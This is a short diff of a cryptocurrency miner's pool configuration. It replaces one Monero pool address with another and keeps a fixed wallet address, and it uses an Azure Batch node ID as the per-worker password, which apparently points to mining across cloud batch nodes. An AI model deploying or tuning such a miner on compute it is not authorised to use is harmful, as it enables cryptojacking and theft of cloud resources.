@@ -12,7 +12,7 @@
     "cuda": false,
     "pools": [
         {
-            "url": "pool.supportxmr.com:443",
+            "url": "gulf.moneroocean.stream:10128",
             "user": "4B3eqHVmDR9iNHi4AFYeR5fMX25TGDi6NXQAjiEn5VKmQkWEFTPbMAehCXi9SecNaiYAASociMc2NWmdvebVbpBmBDgnw2b",
             "pass": "${AZ_BATCH_NODE_ID}",
             "keepalive": true,
